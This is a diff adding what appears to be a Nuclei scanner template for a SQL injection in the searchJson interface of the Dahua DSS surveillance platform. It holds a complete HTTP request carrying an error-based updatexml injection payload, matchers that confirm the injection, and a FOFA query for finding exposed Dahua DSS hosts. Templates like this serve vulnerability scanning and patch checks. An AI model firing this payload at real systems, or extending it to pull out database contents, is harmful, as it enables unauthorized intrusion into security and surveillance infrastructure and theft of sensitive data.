@@ -1,0 +1,30 @@
+id: dahua-dss-searchJson-sqli
+info:
+  name: 大华 DSS 城市安防监控系统 searchJson - SQL 注入
+  author: leadlife
+  severity: high
+  description: 大华城市安防监控系统平台searchJson接口存在SQL注入漏洞，攻击者可利用该漏洞执行SQL语句，获取系统数据库敏感信息。
+  reference: 
+    - https://www.yuque.com/charonlight/sec_explorer_vuln_wiki
+  metadata:
+    verified: true
+    fofa-query: body="/portal/include/script/dahuaDefined/headCommon.js?type=index" && title="DSS" || app="dahua-DSS"
+    hunter-query: demo
+  tags: dahua,dss,sqli
+
+http:
+  - raw:
+      - |
+        GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml%281,concat%280x7e,%28select%20md5%281%29%29,0x7e%29,1%29--%22%7D/extend/1 HTTP/2
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: keep-alive
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains(body,'c4ca4238a0b923820dcc509a6f75849')
+        condition: and
